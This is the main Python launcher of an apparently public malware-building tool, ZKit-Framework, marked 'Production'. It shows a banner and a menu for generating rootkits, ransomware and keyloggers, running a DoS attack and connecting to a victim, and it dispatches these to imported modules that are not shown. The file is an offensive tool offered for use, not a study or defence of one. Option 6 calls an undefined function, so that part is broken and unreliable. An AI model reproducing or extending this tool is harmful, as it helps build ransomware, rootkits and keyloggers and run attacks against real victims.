"ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework"
# Copyright (c) 2020, Zer0 . All rights reserved.
# This Work Is Licensed Under Apache Software License 2.0
# More Can Be Found In The LICENSE File.
__author__ = "Zer0"
__version__ = "1.4.6"
__license__ = "Apache Software License 2.0"
__status__ = "Production"
import os
import sys
from datetime import datetime as dt

from updater import API as updater

try:
    # Doing some imports
    from core.helper_core import notify, Color, Generate, dos, \
        ctrler, init, print_banner, list_builtin_payloads, search_for_payloads, crash_handler
except (ImportError, ModuleNotFoundError) as e:
    # Ops ! Sth is missing

    print(
        "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
        + "Python Threw : "
        + str(e)
    )
    raise

PAYLOAD_CHOICES = {'1': 'rootkit', '2': 'ransomware', '3': 'keylogger'}


def list_builtin_payloads_helper(type_):
    payloads = list_builtin_payloads(type_)
    index = input("")
    Generate(list(payloads.values())[int(index) - 1])


def start():
    "Starts zkit with those beautiful menues"
    try:

        # Printing A Banner More Coming Soon
        _, red, green, yellow, blue, magenta, cyan, _, reset = Color().GetAllColors()
        init()
        print_banner()
        updater().check_for_updates()
        # Hard And Boring Code
        print(
            "\t " * 5 + "Hacking is" + red + " C " + green + "O " + blue + "L " +
            yellow + "O " + magenta + "R " + green +
            "F " + red + "U " + magenta + "L " + reset
        )
        print(
            "Available Options Are :\n"
            + red + "  {1} --> Create A RootKit\n"
            + green + "  {2} --> Create A Ransomware\n"
            + blue + "  {3} --> Create A KeyLogger \n"
            + yellow + "  {4} --> Run A Dos Attack\n"
            + magenta + "  {5} --> Connect To A Victim\n"
            + red + "  {6} --> Generate Your User Payloads\n"
            + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
        )
        while True:
            try:
                choice = str(input("..> "))

                if choice == "000":
                    break

                if choice in PAYLOAD_CHOICES:
                    for key in PAYLOAD_CHOICES:
                        if key == choice:
                            choice = choice.replace(key, PAYLOAD_CHOICES[key])
                            list_builtin_payloads_helper(choice)

                elif choice == "4":
                    dos.main()
                elif choice == "5":
                    ctrler.Main()
                elif choice == "6":
                    payloads = list_payloads()
                    if len(payloads) == 0:
                        print(
                            "No User Payload Was Found . Please Download one from zkit-market or make one using zkit-payload-template")
                    else:
                        print("Please Choose One Of Them (Number Of It): ", end="")
                    index = input("")
                    Generate(list(payloads.values())[int(index) - 1])
                elif choice is not None:
                    notify(
                        "problem", "Invalid Input {" + "{}".format(choice) + "}")
            except (KeyboardInterrupt, EOFError):
                print("\nPlease Type '000' To Exit ZKit-Framework\n")
                choice = None
    except BaseException as e:
        crash_handler(e)


start()
